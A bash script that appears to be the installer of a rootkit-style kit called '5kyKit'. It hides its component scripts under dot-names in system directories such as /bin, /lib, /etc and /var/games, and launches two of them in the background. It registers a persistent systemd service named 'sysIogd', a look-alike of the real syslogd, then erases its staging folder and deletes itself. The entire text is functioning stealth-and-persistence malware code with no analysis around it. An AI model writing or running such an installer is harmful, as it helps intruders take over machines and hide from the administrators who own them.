#!/bin/bash
mkdir /etc/.music
mv /etc/.a/5kyKit/skyrim.py /etc/.music/.skyrim.py
chmod +x /etc/.music/.skyrim.py
mv /etc/.a/5kyKit/log.sh /var/spool/.log.sh
chmod +x /var/spool/.log.sh
mv /etc/.a/5kyKit/systemm.sh /bin/.systemm.sh
chmod +x /bin/.systemm.sh
bash /bin/.systemm.sh &
mv /etc/.a/5kyKit/resolver.sh /etc/.resolver.sh
chmod +x /etc/.resolver.sh
bash /etc/.resolver.sh &
mv /etc/.a/5kyKit/creator.sh /var/games/.creator.sh
chmod +x /var/games/.creator.sh
mv /etc/.a/5kyKit/sysIogd.sh /lib/.sysIogd.sh
chmod +x /lib/.sysIogd.sh
mv /etc/.a/5kyKit/sysIogd.service /etc/systemd/system/sysIogd.service
systemctl enable sysIogd
systemctl daemon-reload
systemctl start sysIogd
echo Installation complete.
rm -rf /etc/.a/5kyKit
rm -- "$0"